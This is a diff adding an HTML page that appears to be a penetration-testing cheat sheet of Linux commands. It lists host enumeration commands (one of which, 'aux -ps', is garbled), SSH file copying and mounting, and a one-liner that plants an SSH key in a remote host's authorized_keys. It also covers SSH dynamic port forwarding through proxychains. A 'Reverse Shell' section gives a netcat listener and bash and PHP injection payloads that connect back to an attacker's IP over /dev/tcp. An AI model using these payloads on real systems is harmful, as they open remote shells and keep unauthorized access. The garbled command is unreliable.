@@ -1,1 +1,30 @@
-html
+<!DOCTYPE html>
+<html>
+<body>
+<div>
+<h3>Linux</h3>
+<h4>General</h4>
+<code>crontab -l<br/>aux -ps</code>
+<h4>Very useful link</h4>
+<a href="https://gtfobins.github.io/"> gtfobins.github.io</a>
+<h4>SSH</h4>
+<code>scp [source_file] [user]@$IP:[destination_path]</code>
+<h4>Mount</h4>
+<code>sshfs [user]@$IP:[destination_path] [source_file]</code>
+<h4>Copy local SSH Key (~/.ssh/id_rsa.pub) into remote Host</h4>
+<code>mkdir -p ~/.ssh &#38&#38 chmod 700 ~/.ssh &#38&#38 touch ~/.ssh/authorized_keys &#38&#38 chmod 600 ~/.ssh/authorized_keys &#38&#38 echo "ssh-rsa &#60INSERT KEY&#62; root@HOSTNAME" >> ~/.ssh/authorized_keys<br/><br/>ssh -i ~/.ssh/id_rsa &#60user&#62@&#60IP&#62</code>
+<h4>SSH Tunnel Dynamic Port Forwarding</h4>
+<code>vim /etc/proxychains.conf (edit conf to set listening port)<br/>ssh -D &#60listening port&#62 <host> -l &#60username&#62<br/>(leave window with above command running)<br/>proxychains &#60command&#62 (nmap/firefox etc)</code>
+<h3>Reverse Shell</h3>
+<h4>Listen Side:</h4>
+<code>nc -nlvp 12345</code>
+<h4>Server Side Injection Code:</h4>
+    <p style="color:#3276B1">Bash </p>
+        <code>/bin/bash -i >& /dev/tcp/&#60ip&#62/12345 0>&1</code> 
+    <p style="color:#3276B1">PHP </p>
+        <code> &#60?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/&#60ip&#62/12345 0>&1’”); phpinfo(); ?&#62</code> 
+    
+</div>
+<br><br>
+</body></html>
+
